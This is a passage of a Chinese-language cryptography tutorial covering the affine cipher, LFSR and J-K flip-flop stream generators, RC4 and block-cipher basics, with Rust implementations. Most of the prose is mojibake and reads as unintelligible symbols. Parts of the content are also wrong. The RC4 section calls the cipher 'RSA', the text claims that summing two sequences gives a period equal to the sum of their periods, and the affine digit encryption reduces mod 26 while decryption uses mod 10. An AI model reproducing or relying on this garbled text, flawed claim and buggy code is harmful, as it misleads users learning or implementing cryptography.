Cipherï¼‰ï¼Œåˆç§°ä¸ºæµå¯†ç ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œå¯†ç è®¾è®¡è€…çš„æ ¹æœ¬ç›®æ ‡æ˜¯ä¿éšœä¿¡æ¯åŠä¿¡æ¯ç³»ç»Ÿçš„ æœºå¯†æ€§ï¼ˆConfidentialityï¼‰ å®Œæ•´æ€§ï¼ˆIntegrityï¼‰ å¯ç”¨æ€§ï¼ˆAvailabilityï¼‰ è®¤è¯æ€§ï¼ˆAuthenticationï¼‰ ä¸å¯å¦è®¤æ€§ï¼ˆNon-repudiationï¼‰ å…¶ä¸­ï¼Œå‰ä¸‰è€…è¢«ç§°ä¸ºä¿¡æ¯å®‰å…¨çš„ CIA ä¸‰è¦ç´  ã€‚ æœ¬æ–‡ä¸»è¦ä»‹ç»äº†ä»¿å°„å¯†ç ï¼Œæµå¯†ç ï¼ˆRC4,LFSR+JK)ï¼Œåˆ†ç»„å¯†ç ï¼ˆDES,AESï¼‰ï¼Œéå¯¹ç§°åŠ å¯†ï¼ˆrsaï¼‰å’Œå¯†ç åè®®ï¼ˆDiffie_Hellmanï¼‰ã€‚é¡¹ç›®è¯¦ç»†ä»£ç å·²äºGithubå¼€æº[1]ã€‚ ä»¿å°„å¯†ç åŸç†ä»¿å°„å¯†ç çš„åŠ å¯†å‡½æ•°æ˜¯ $E(x)=(ax+b)\\pmod m$ï¼Œå…¶ä¸­ $x$ è¡¨ç¤ºæ˜æ–‡æŒ‰ç…§æŸç§ç¼–ç å¾—åˆ°çš„æ•°å­— $a$ å’Œ $m$ äº’è´¨ $m$ æ˜¯ç¼–ç ç³»ç»Ÿä¸­å­—æ¯çš„æ•°ç›®ã€‚ è§£å¯†å‡½æ•°æ˜¯ $D(x)=a^{-1}(x-b)\\pmod m$ï¼Œå…¶ä¸­ $a^{-1}$ æ˜¯ $a$ åœ¨ $\\mathbb{Z}_{m}$ ç¾¤çš„ä¹˜æ³•é€†å…ƒã€‚ ä¸‹é¢æˆ‘ä»¬ä»¥ $E(x) = (5x + 8) \\bmod 26$ å‡½æ•°ä¸ºä¾‹å­è¿›è¡Œä»‹ç»ï¼ŒåŠ å¯†å­—ç¬¦ä¸²ä¸º AFFINE CIPHERï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥é‡‡ç”¨å­—æ¯è¡¨26ä¸ªå­—æ¯ä½œä¸ºç¼–ç ç³»ç»Ÿ æ˜æ–‡ A F F I N E C I P H E R x 0 5 5 8 13 4 2 8 15 7 4 17 $y=5x+8$ 8 33 33 48 73 28 18 48 83 43 28 93 $y\\mod26$ 8 7 7 22 21 2 18 22 5 17 2 15 å¯†æ–‡ I H H W V C S W F R C P å…¶å¯¹åº”çš„åŠ å¯†ç»“æœæ˜¯ IHHWVCSWFRCPã€‚ å¯¹äºè§£å¯†è¿‡ç¨‹ï¼Œæ­£å¸¸è§£å¯†è€…å…·æœ‰aä¸bï¼Œå¯ä»¥è®¡ç®—å¾—åˆ° $a^{-1}$ ä¸º 21ï¼Œæ‰€ä»¥å…¶è§£å¯†å‡½æ•°æ˜¯$D(x)=21(x-8)\\pmod {26}$ ï¼Œè§£å¯†å¦‚ä¸‹ å¯†æ–‡ I H H W V C S W F R C P $y$ 8 7 7 22 21 2 18 22 5 17 2 15 $x=21(y-8)$ 0 -21 -21 294 273 -126 210 294 -63 189 -126 147 $x\\mod26$ 0 5 5 8 13 4 2 8 15 7 4 17 æ˜æ–‡ A F F I N E C I P H E R å¯ä»¥çœ‹å‡ºå…¶ç‰¹ç‚¹åœ¨äºåªæœ‰ 26 ä¸ªè‹±æ–‡å­—æ¯ã€‚ Rustå®ç°12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667// Encryptlet mut ans = String::new();for ch in msg.chars() &#123; if ch.is_ascii_alphabetic() &#123; if ch.is_uppercase() &#123; // å¤§å†™å­—æ¯ let x = ch as u32 - &#x27;A&#x27; as u32; let y = (upper_a * x + upper_b) % 26; let target = &#x27;A&#x27; as u32 + y; let new_ch = char::try_from(target).unwrap(); ans.push(new_ch); &#125; else &#123; // å°å†™å­—æ¯ let x = ch as u32 - &#x27;a&#x27; as u32; let y = (lower_a * x + lower_b) % 26; let target = &#x27;a&#x27; as u32 + y; let new_ch = char::try_from(target).unwrap(); ans.push(new_ch); &#125; &#125; else if ch.is_ascii_digit() &#123; // æ•°å­— let x = ch as u32 - &#x27;0&#x27; as u32; let y = (number_a * x + number_b) % 26; let target = &#x27;0&#x27; as u32 + y; let new_ch = char::try_from(target).unwrap(); ans.push(new_ch); &#125; else &#123; ans.push(ch); &#125;&#125;return Ok(ans);// Decryptlet lower_a_ = exgcd(lower_a as i32, 26) as u32;let upper_a_ = exgcd(upper_a as i32, 26) as u32;let number_a_ = exgcd(number_a as i32, 10) as u32;let mut ans = String::new();for ch in msg.chars() &#123; if ch.is_ascii_alphabetic() &#123; if ch.is_uppercase() &#123; // å¤§å†™å­—æ¯ let x = ch as u32 - &#x27;A&#x27; as u32; let y = (upper_a_ * (x + 26 - upper_b)) % 26; let target = &#x27;A&#x27; as u32 + y; let new_ch = char::try_from(target).unwrap(); ans.push(new_ch); &#125; else &#123; // å°å†™å­—æ¯ let x = ch as u32 - &#x27;a&#x27; as u32; let y = (lower_a_ * (x + 26 - lower_b)) % 26; let target = &#x27;a&#x27; as u32 + y; let new_ch = char::try_from(target).unwrap(); ans.push(new_ch); &#125; &#125; else if ch.is_ascii_digit() &#123; // æ•°å­— let x = ch as u32 - &#x27;0&#x27; as u32; let y = (number_a_ * (x + 10 - number_b)) % 10; let target = &#x27;0&#x27; as u32 + y; let new_ch = char::try_from(target).unwrap(); ans.push(new_ch); &#125; else &#123; ans.push(ch); &#125;&#125;return Ok(ans); ç ´è§£é¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°çš„æ˜¯ï¼Œä»¿å°„å¯†ç å¯¹äºä»»æ„ä¸¤ä¸ªä¸åŒçš„å­—æ¯ï¼Œå…¶æœ€åå¾—åˆ°çš„å¯†æ–‡å¿…ç„¶ä¸ä¸€æ ·ï¼Œæ‰€ä»¥å…¶ä¹Ÿå…·æœ‰æœ€é€šç”¨çš„ç‰¹ç‚¹ã€‚å½“å¯†æ–‡é•¿åº¦è¶³å¤Ÿé•¿æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨é¢‘ç‡åˆ†æçš„æ–¹æ³•æ¥è§£å†³ã€‚ å…¶æ¬¡ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘å¦‚ä½•æ”»å‡»è¯¥å¯†ç ã€‚å¯ä»¥çœ‹å‡ºå½“$a=1$ æ—¶ï¼Œä»¿å°„åŠ å¯†æ˜¯å‡¯æ’’åŠ å¯†ã€‚è€Œä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬åˆ©ç”¨ä»¿å°„å¯†ç æ—¶ï¼Œå…¶å­—ç¬¦é›†éƒ½ç”¨çš„æ˜¯å­—æ¯è¡¨ï¼Œä¸€èˆ¬åªæœ‰26ä¸ªå­—æ¯ï¼Œè€Œä¸å¤§äº26çš„ä¸26äº’ç´ çš„ä¸ªæ•°ä¸€å…±æœ‰ $$\\phi(26)=\\phi(2) \\times \\phi(13) = 12$$ ç®—ä¸Šbçš„åç§»å¯èƒ½ï¼Œä¸€å…±æœ‰å¯èƒ½çš„å¯†é’¥ç©ºé—´å¤§å°ä¹Ÿå°±æ˜¯ $$12 \\times 26 = 312$$ ä¸€èˆ¬æ¥è¯´ï¼Œå¯¹äºè¯¥ç§å¯†ç ï¼Œæˆ‘ä»¬è‡³å°‘å¾—æ˜¯åœ¨å·²çŸ¥éƒ¨åˆ†æ˜æ–‡çš„æƒ…å†µä¸‹æ‰å¯ä»¥æ”»å‡»ã€‚ä¸‹é¢è¿›è¡Œç®€å•çš„åˆ†æã€‚ è¿™ç§å¯†ç ç”±ä¸¤ç§å‚æ•°æ¥æ§åˆ¶ï¼Œå¦‚æœæˆ‘ä»¬çŸ¥é“å…¶ä¸­ä»»æ„ä¸€ä¸ªå‚æ•°ï¼Œé‚£æˆ‘ä»¬ä¾¿å¯ä»¥å¾ˆå®¹æ˜“åœ°å¿«é€Ÿæšä¸¾å¦å¤–ä¸€ä¸ªå‚æ•°å¾—åˆ°ç­”æ¡ˆã€‚ ä½†æ˜¯ï¼Œå‡è®¾æˆ‘ä»¬å·²ç»çŸ¥é“é‡‡ç”¨çš„å­—æ¯é›†ï¼Œè¿™é‡Œå‡è®¾ä¸º26ä¸ªå­—æ¯ï¼Œæˆ‘ä»¬è¿˜æœ‰å¦å¤–ä¸€ç§è§£å¯†æ–¹å¼ï¼Œæˆ‘ä»¬åªéœ€è¦çŸ¥é“ä¸¤ä¸ªåŠ å¯†åçš„å­—æ¯ $y_1,y_2$ å³å¯è¿›è¡Œè§£å¯†ã€‚é‚£ä¹ˆæˆ‘ä»¬è¿˜å¯ä»¥çŸ¥é“ $$y_1=(ax_1+b)\\pmod{26} \\y_2=(ax_2+b)\\pmod{26}$$ ä¸¤å¼ç›¸å‡ï¼Œå¯å¾— $$y_1-y_2=a(x_1-x_2)\\pmod{26}$$ è¿™é‡Œ $y_1,y_2$ å·²çŸ¥ï¼Œå¦‚æœæˆ‘ä»¬çŸ¥é“å¯†æ–‡å¯¹åº”çš„ä¸¤ä¸ªä¸ä¸€æ ·çš„å­—ç¬¦ $x_1$ ä¸ $x_2$ ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å¾ˆå®¹æ˜“å¾—åˆ° $a$ ï¼Œè¿›è€Œå°±å¯ä»¥å¾—åˆ° $b$ äº†ã€‚ æµå¯†ç æµå¯†ç ä¸€èˆ¬é€å­—èŠ‚æˆ–è€…é€æ¯”ç‰¹å¤„ç†ä¿¡æ¯ã€‚ä¸€èˆ¬æ¥è¯´ æµå¯†ç çš„å¯†é’¥é•¿åº¦ä¼šä¸æ˜æ–‡çš„é•¿åº¦ç›¸åŒã€‚ æµå¯†ç çš„å¯†é’¥æ´¾ç”Ÿè‡ªä¸€ä¸ªè¾ƒçŸ­çš„å¯†é’¥ï¼Œæ´¾ç”Ÿç®—æ³•é€šå¸¸ä¸ºä¸€ä¸ªä¼ªéšæœºæ•°ç”Ÿæˆç®—æ³•ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒæµåŠ å¯†ç›®å‰æ¥è¯´éƒ½æ˜¯å¯¹ç§°åŠ å¯†ã€‚ ä¼ªéšæœºæ•°ç”Ÿæˆç®—æ³•ç”Ÿæˆçš„åºåˆ—çš„éšæœºæ€§è¶Šå¼ºï¼Œæ˜æ–‡ä¸­çš„ç»Ÿè®¡ç‰¹å¾è¢«è¦†ç›–çš„æ›´å¥½ã€‚ æµå¯†ç åŠ è§£å¯†éå¸¸ç®€å•ï¼Œåœ¨å·²çŸ¥æ˜æ–‡çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥éå¸¸å®¹æ˜“åœ°è·å–å¯†é’¥æµã€‚ æµå¯†ç çš„å…³é”®åœ¨äºè®¾è®¡å¥½çš„ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä¼ªéšæœºæ•°ç”Ÿæˆå™¨çš„åŸºæœ¬æ„é€ æ¨¡å—ä¸ºåé¦ˆç§»ä½å¯„å­˜å™¨ã€‚å½“ç„¶ï¼Œä¹Ÿæœ‰ä¸€äº›ç‰¹æ®Šè®¾è®¡çš„æµå¯†ç ï¼Œæ¯”å¦‚ RC4ã€‚ åé¦ˆç§»ä½å¯„å­˜å™¨ä¸€èˆ¬çš„ï¼Œä¸€ä¸ª n çº§åé¦ˆç§»ä½å¯„å­˜å™¨å¦‚ä¸‹å›¾æ‰€ç¤º å…¶ä¸­ $a_0$ï¼Œ$a_1$ï¼Œâ€¦ï¼Œ$a_{n-1}$ ä¸ºåˆæ€ã€‚ F ä¸ºåé¦ˆå‡½æ•°æˆ–è€…åé¦ˆé€»è¾‘ã€‚å¦‚æœ F ä¸ºçº¿æ€§å‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç§°å…¶ä¸ºçº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨ï¼ˆLFSRï¼‰ï¼Œå¦åˆ™æˆ‘ä»¬ç§°å…¶ä¸ºéçº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨ï¼ˆNFSRï¼‰ã€‚ $a_{i+n}=F(a_i,a_{i+1},â€¦,a_{i+n-1})$ ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œåé¦ˆç§»ä½å¯„å­˜å™¨éƒ½ä¼šå®šä¹‰åœ¨æŸä¸ªæœ‰é™åŸŸä¸Šï¼Œä»è€Œé¿å…æ•°å­—å¤ªå¤§å’Œå¤ªå°çš„é—®é¢˜ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶è§†ä¸ºåŒä¸€ä¸ªç©ºé—´ä¸­çš„å˜æ¢ï¼Œå³ $(a_i,a_{i+1},â€¦,a_{i+n-1}) \\rightarrow (a_{i+1},â€¦,a_{i+n-1},a_{i+n})$.å¯¹äºä¸€ä¸ªåºåˆ—æ¥è¯´ï¼Œæˆ‘ä»¬ä¸€èˆ¬å®šä¹‰å…¶ç”Ÿæˆå‡½æ•°ä¸ºå…¶åºåˆ—å¯¹åº”çš„å¹‚çº§æ•°çš„å’Œã€‚ çº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨ - LFSRä»‹ç»çº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨çš„åé¦ˆå‡½æ•°ä¸€èˆ¬å¦‚ä¸‹ $a_{i+n}=\\sum\\limits_{j=1}^{n}c_ja_{i+n-j}$ å…¶ä¸­ï¼Œ$c_j$ å‡åœ¨æŸä¸ªæœ‰é™åŸŸ $F_q$ ä¸­ã€‚ æ—¢ç„¶çº¿æ€§ç©ºé—´æ˜¯ä¸€ä¸ªçº¿æ€§å˜æ¢ï¼Œæˆ‘ä»¬å¯ä»¥å¾—çŸ¥è¿™ä¸ªçº¿æ€§å˜æ¢ä¸º $$ \\begin{align*}&amp;\\left[ a_{i+1},a_{i+2},a_{i+3}, â€¦,a_{i+n}\\right]\\\\ \\\\ =&amp;\\left[ a_{i},a_{i+1},a_{i+2}, â€¦,a_{i+n-1}\\right]\\left[ \\begin{matrix} 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; c_n \\\\ 1 &amp; 0 &amp; \\cdots &amp; 0 &amp; c_{n-1} \\\\ 0 &amp; 1 &amp; \\cdots &amp; 0 &amp; c_{n-2} \\\\ \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ 0 &amp; 0 &amp; \\cdots &amp; 1 &amp; c_1 \\\\ \\end{matrix} \\right] \\\\ \\\\ =&amp;\\left[ a_{0},a_{1},a_{2}, â€¦,a_{n-1}\\right]\\left[ \\begin{matrix} 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; c_n \\\\ 1 &amp; 0 &amp; \\cdots &amp; 0 &amp; c_{n-1} \\\\ 0 &amp; 1 &amp; \\cdots &amp; 0 &amp; c_{n-2} \\\\ \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ 0 &amp; 0 &amp; \\cdots &amp; 1 &amp; c_1 \\\\ \\end{matrix} \\right]^{i+1}\\end{align*} $$ è¿›è€Œï¼Œæˆ‘ä»¬å¯ä»¥æ±‚å¾—å…¶ç‰¹å¾å¤šé¡¹å¼ä¸º $f(x)=x^n-\\sum\\limits_{i=1}^{n}c_ix^{n-i}$ åŒæ—¶ï¼Œæˆ‘ä»¬å®šä¹‰å…¶äº’åå¤šé¡¹å¼ä¸º $\\overline f(x)=x^nf(\\frac{1}{x})=1-\\sum\\limits_{i=1}^{n}c_ix^{i}$ æˆ‘ä»¬ä¹Ÿç§°äº’åå¤šé¡¹å¼ä¸ºçº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨çš„è”ç»“å¤šé¡¹å¼ã€‚ è¿™é‡Œæœ‰ä¸€äº›å®šç†éœ€è¦æˆ‘ä»¬è®°ä¸€ä¸‹ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥è‡ªè¡Œæ¨å¯¼ã€‚ æ ·ä¾‹ ç‰¹å¾å¤šé¡¹å¼ä¸ç”Ÿæˆå‡½æ•°å·²çŸ¥æŸä¸ª n çº§çº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨çš„ç‰¹å¾å¤šé¡¹å¼ï¼Œé‚£ä¹ˆè¯¥åºåˆ—å¯¹åº”çš„ç”Ÿæˆå‡½æ•°ä¸º $A(x)=\\frac{p(x)}{\\overline f(x)}$ å…¶ä¸­ï¼Œ$p(x)=\\sum\\limits_{i=1}^{n}(c_{n-i}x^{n-i}\\sum\\limits_{j=1}^{i}a_jx^{j-1})$ã€‚å¯ä»¥çœ‹å‡º p(x) å®Œå…¨ç”±åˆå§‹çŠ¶æ€å’Œåé¦ˆå‡½æ•°çš„ç³»æ•°å†³å®šã€‚ åºåˆ—å‘¨æœŸä¸ç”Ÿæˆå‡½æ•°åºåˆ—çš„çš„å‘¨æœŸä¸ºå…¶ç”Ÿæˆå‡½æ•°çš„æ—¢çº¦çœŸåˆ†å¼çš„åˆ†æ¯çš„å‘¨æœŸã€‚ å¯¹äº n çº§çº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨ï¼Œæœ€é•¿å‘¨æœŸä¸º $2^{n}-1$ï¼ˆæ’é™¤å…¨é›¶ï¼‰ã€‚è¾¾åˆ°æœ€é•¿å‘¨æœŸçš„åºåˆ—ä¸€èˆ¬ç§°ä¸º m åºåˆ—ã€‚ ç‰¹æ®Šæ€§è´¨ å°†ä¸¤ä¸ªåºåˆ—ç´¯åŠ å¾—åˆ°æ–°çš„åºåˆ—çš„å‘¨æœŸä¸ºè¿™ä¸¤ä¸ªåºåˆ—çš„å‘¨æœŸçš„å’Œã€‚ åºåˆ—æ˜¯ n çº§ m åºåˆ—ï¼Œå½“ä¸”ä»…å½“åºåˆ—çš„æå°å¤šé¡¹å¼æ˜¯ n æ¬¡æœ¬åŸå¤šé¡¹å¼ã€‚ B-M ç®—æ³•ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥ä»ä¸¤ç§è§’åº¦æ¥è€ƒè™‘ LFSR å¯†é’¥ç”Ÿæˆè§’åº¦ï¼Œä¸€èˆ¬æˆ‘ä»¬å¸Œæœ›ä½¿ç”¨çº§æ•°å°½å¯èƒ½ä½çš„ LFSR æ¥ç”Ÿæˆå‘¨æœŸå¤§ï¼Œéšæœºæ€§å¥½çš„åºåˆ—ã€‚ å¯†ç åˆ†æè§’åº¦ï¼Œç»™å®šä¸€ä¸ªé•¿åº¦ä¸º n çš„åºåˆ— aï¼Œå¦‚ä½•æ„é€ ä¸€ä¸ªçº§æ•°å°½å¯èƒ½å°çš„ LFSR æ¥ç”Ÿæˆå®ƒã€‚å…¶å®è¿™å°±æ˜¯ B-M ç®—æ³•çš„æ¥æºã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªåºåˆ—çš„çº¿æ€§å¤æ‚åº¦å¦‚ä¸‹ è‹¥ s ä¸ºä¸€ä¸ªå…¨é›¶åºåˆ—ï¼Œåˆ™çº¿æ€§å¤æ‚åº¦ä¸º0ã€‚ è‹¥æ²¡æœ‰ LFSR èƒ½ç”Ÿæˆ sï¼Œåˆ™çº¿æ€§å¤æ‚åº¦ä¸ºæ— ç©·ã€‚ å¦åˆ™ï¼Œs çš„çº¿æ€§å¤æ‚åº¦ä¸ºç”Ÿæˆ L(s) çš„æœ€å°çº§çš„ LFSRã€‚ BM ç®—æ³•çš„è¦æ±‚æˆ‘ä»¬éœ€è¦çŸ¥é“é•¿åº¦ä¸º 2n çš„åºåˆ—ã€‚å…¶å¤æ‚åº¦ æ—¶é—´å¤æ‚åº¦ï¼šO(n^2) æ¬¡æ¯”ç‰¹æ“ä½œ ç©ºé—´å¤æ‚åº¦ï¼šO(n) æ¯”ç‰¹ã€‚ å…³äº BM ç®—æ³•çš„ç»†èŠ‚ï¼Œåç»­æ·»åŠ ï¼Œç›®å‰å¤„äºå­¦ä¹ è¿‡ç¨‹ä¸­ã€‚ ä½†æ˜¯å…¶å®å¦‚æœæˆ‘ä»¬çŸ¥é“äº†é•¿åº¦ä¸º 2n çš„åºåˆ—ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä¸€ç§æ¯”è¾ƒç¬¨çš„æ–¹æ³•æ¥è·å–åŸå…ˆçš„åºåˆ—ã€‚ä¸å¦¨å‡è®¾å·²çŸ¥çš„åºåˆ—ä¸º$a_1,â€¦,a_{2n}$ï¼Œæˆ‘ä»¬å¯ä»¥ä»¤ $S_1=(a_1,â€¦,a_n)$ $S_2=(a_2,â€¦,a_{n+1})$ â€¦. $S_{n+1}=(a_{n+1},â€¦,a_{2n})$ é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ„é€ çŸ©é˜µ $X=(S_1,â€¦,S_n)$ï¼Œé‚£ä¹ˆ $S_{n+1}=(c_n,â€¦,c_1)X$ æ‰€ä»¥ $(c_n,â€¦,c_1)=S_{n+1}X^{-1}$ è¿›è€Œæˆ‘ä»¬ä¹Ÿå°±çŸ¥é“äº† LFSR çš„åé¦ˆè¡¨è¾¾å¼ï¼Œè¿›è€Œæˆ‘ä»¬å°±å¯ä»¥æ¨å‡ºåˆå§‹åŒ–ç§å­ã€‚ éçº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨ä»‹ç»ä¸ºäº†ä½¿å¾—å¯†é’¥æµè¾“å‡ºçš„åºåˆ—å°½å¯èƒ½å¤æ‚ï¼Œä¼šä½¿ç”¨éçº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨ï¼Œå¸¸è§çš„æœ‰ä¸‰ç§ éçº¿æ€§ç»„åˆç”Ÿæˆå™¨ï¼Œå¯¹å¤šä¸ª LFSR çš„è¾“å‡ºä½¿ç”¨ä¸€ä¸ªéçº¿æ€§ç»„åˆå‡½æ•° éçº¿æ€§æ»¤æ³¢ç”Ÿæˆå™¨ï¼Œå¯¹ä¸€ä¸ª LFSR çš„å†…å®¹ä½¿ç”¨ä¸€ä¸ªéçº¿æ€§ç»„åˆå‡½æ•° é’Ÿæ§ç”Ÿæˆå™¨ï¼Œä½¿ç”¨ä¸€ä¸ªï¼ˆæˆ–å¤šä¸ªï¼‰LFSR çš„è¾“å‡ºæ¥æ§åˆ¶å¦ä¸€ä¸ªï¼ˆæˆ–å¤šä¸ªï¼‰LFSR çš„æ—¶é’Ÿ éçº¿æ€§ç»„åˆç”Ÿæˆå™¨ç®€ä»‹ç»„åˆç”Ÿæˆå™¨ä¸€èˆ¬å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ JKè§¦å‘å™¨ åˆ©ç”¨J-Kè§¦å‘å™¨çš„éçº¿æ€§åºåˆ—ç”Ÿæˆå™¨ æ ·ä¾‹ Rustå®ç°123456789101112131415161718192021222324252627282930313233343536373839404142pub struct LfsrJk &#123; j_state: u32, k_state: u32, j_state_c: u32, k_state_c: u32, data_state: u8,&#125;impl LfsrJk &#123; pub fn new(j_state: u32, k_state: u32, j_state_c: u32, k_state_c: u32, data_state: u8) -&gt; Self &#123; Self &#123; j_state: 0x12345678 - j_state, k_state: 0x87654321 - k_state, j_state_c: 0xffffffff - j_state_c, k_state_c: 0xffffffff - k_state_c, data_state, &#125; &#125; pub fn crypt(&amp;self, data: &amp;mut [u8]) &#123; let mut j_state = self.j_state; let mut k_state = self.k_state; let mut data_state = self.data_state; let len = data.len(); for i in 0..len &#123; let j = Self::round(&amp;mut j_state, self.j_state_c); let k = Self::round(&amp;mut k_state, self.k_state_c); data_state = j ^ (!(j ^ k) &amp; data_state); data[i] ^= data_state; &#125; &#125; #[inline] fn round(state: &amp;mut u32, state_c: u32) -&gt; u8 &#123; let mut output = 0u8; for _ in 0..8 &#123; let t = *state &amp; state_c; let new_out = t.count_ones() % 2; let out = (0x80000000 &amp; t) &gt;&gt; 31; output = (output &lt;&lt; 1) + out as u8; *state = (*state &lt;&lt; 1) + new_out; &#125; output &#125;&#125; RC4åŸºæœ¬ä»‹ç»RSA ç”± Ron Rivest è®¾è®¡ï¼ŒåŠ è§£å¯†ä½¿ç”¨ç›¸åŒçš„å¯†é’¥ï¼Œå› æ­¤ä¹Ÿå±äºå¯¹ç§°åŠ å¯†ç®—æ³•ã€‚å®ƒæ˜¯é¢å‘å­—èŠ‚çš„æµå¯†ç ï¼Œå¯†é’¥é•¿åº¦å¯å˜ï¼Œéå¸¸ç®€å•ï¼Œä½†ä¹Ÿå¾ˆæœ‰æ•ˆæœã€‚RC4 ç®—æ³•æ›¾å¹¿æ³›åº”ç”¨äº SSL/TLS åè®®å’Œ WEP/WPA åè®®ï¼Œä½†ç”±äºRC4ç®—æ³•å­˜åœ¨å¼±ç‚¹ï¼Œ2015å¹´2æœˆæ‰€å‘å¸ƒçš„ RFC 7465 è§„å®šç¦æ­¢åœ¨TLSä¸­ä½¿ç”¨RC4åŠ å¯†ç®—æ³•ã€‚ åŸºæœ¬æµç¨‹RC4 ä¸»è¦åŒ…å«ä¸‰ä¸ªæµç¨‹ åˆå§‹åŒ– S å’Œ T æ•°ç»„ã€‚ åˆå§‹åŒ–ç½®æ¢ Sã€‚ ç”Ÿæˆå¯†é’¥æµã€‚ åˆå§‹åŒ– S å’Œ T æ•°ç»„åˆå§‹åŒ– S å’Œ T çš„ä»£ç å¦‚ä¸‹ 123for i = 0 to 255 do S[i] = i T[i] = K[i mod keylen]) åˆå§‹åŒ–ç½®æ¢ S1234j = 0for i = 0 to 255 do j = (j + S[i] + T[i]) (mod 256) swap (S[i], S[j]) ç”Ÿæˆæµå¯†é’¥1234567i = j = 0 for each message byte b i = (i + 1) (mod 256) j = (j + S[i]) (mod 256) swap(S[i], S[j]) t = (S[i] + S[j]) (mod 256) print S[t] æˆ‘ä»¬ä¸€èˆ¬ç§°å‰ä¸¤éƒ¨åˆ†ä¸º KSA ï¼Œæœ€åä¸€éƒ¨åˆ†æ˜¯ PRGAã€‚ Rustå®ç°123456789101112131415161718192021222324252627282930313233343536373839404142434445464748pub struct Rc4 &#123; s: [u32; 256], key: Vec&lt;u8&gt;,&#125;impl Rc4 &#123; pub fn new(key: Vec&lt;u8&gt;) -&gt; Self &#123; let mut key = key; if key.len() == 0 &#123; key = vec![1, 2, 3, 4, 5]; &#125; let mut rc4 = Self &#123; s: [0u32; 256], key, &#125;; rc4.init(); rc4 &#125; pub fn init(&amp;mut self) &#123; let mut k = vec![0u32; 256]; for i in 0..256 &#123; self.s[i] = i as u32; k[i] = self.key[i % self.key.len()] as u32; &#125; let mut j = 0; for i in 0..256 &#123; j = (j + self.s[i] + k[i]) % 256; let tmp = self.s[i]; self.s[i] = self.s[j as usize]; self.s[j as usize] = tmp; &#125; &#125; pub fn crypt(&amp;mut self, data: &amp;mut [u8]) &#123; let mut i = 0; let mut j = 0; let mut t = 0; let mut s = self.s.clone(); for k in 0..data.len() &#123; i = (i + 1) % 256; j = (j + s[i]) % 256; let tmp = s[i]; s[i] = s[j as usize]; s[j as usize] = tmp; t = (s[i] + s[j as usize]) % 256; data[k] ^= s[t as usize] as u8; &#125; &#125;&#125; å—åŠ å¯†æ¦‚è¿°æ‰€è°“å—åŠ å¯†å°±æ˜¯æ¯æ¬¡åŠ å¯†ä¸€å—æ˜æ–‡ï¼Œå¸¸è§çš„åŠ å¯†ç®—æ³•æœ‰ IDEA åŠ å¯† DES åŠ å¯† AES åŠ å¯† å—åŠ å¯†ä¹Ÿæ˜¯å¯¹ç§°åŠ å¯†ã€‚ å…¶å®ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æŠŠå—åŠ å¯†ç†è§£ä¸€ç§ç‰¹æ®Šçš„æ›¿ä»£å¯†ç ï¼Œä½†æ˜¯å…¶æ¯æ¬¡æ›¿ä»£çš„æ˜¯ä¸€å¤§å—ã€‚è€Œæ­£æ˜¯ç”±äºä¸€å¤§å—ï¼Œæ˜æ–‡ç©ºé—´å·¨å¤§ï¼Œè€Œä¸”å¯¹äºä¸åŒçš„å¯†é’¥ï¼Œæˆ‘ä»¬æ— æ³•åšä¸€ä¸ªè¡¨è¿›è¡Œå¯¹åº”ç›¸åº”çš„å¯†æ–‡ï¼Œå› æ­¤å¿…é¡»å¾—æœ‰ å¤æ‚ çš„åŠ è§£å¯†ç®—æ³•æ¥åŠ è§£å¯†æ˜å¯†æ–‡ã€‚ è€Œä¸æ­¤åŒæ—¶ï¼Œæ˜æ–‡å¾€å¾€å¯èƒ½å¾ˆé•¿ä¹Ÿå¯èƒ½å¾ˆçŸ­ï¼Œå› æ­¤åœ¨å—åŠ å¯†æ—¶å¾€å¾€éœ€è¦ä¸¤ä¸ªè¾…åŠ© paddingï¼Œå³ padding åˆ°æŒ‡å®šåˆ†ç»„é•¿åº¦ åˆ†ç»„åŠ å¯†æ¨¡å¼ï¼Œå³æ˜æ–‡åˆ†ç»„åŠ å¯†çš„æ–¹å¼ã€‚ å¡«å……è§„åˆ™æ­£å¦‚æˆ‘ä»¬ä¹‹å‰æ‰€è¯´ï¼Œåœ¨åˆ†ç»„åŠ å¯†ä¸­ï¼Œæ˜æ–‡çš„é•¿åº¦å¾€å¾€å¹¶ä¸æ»¡è¶³è¦æ±‚ï¼Œéœ€è¦è¿›è¡Œ paddingï¼Œè€Œå¦‚ä½• padding 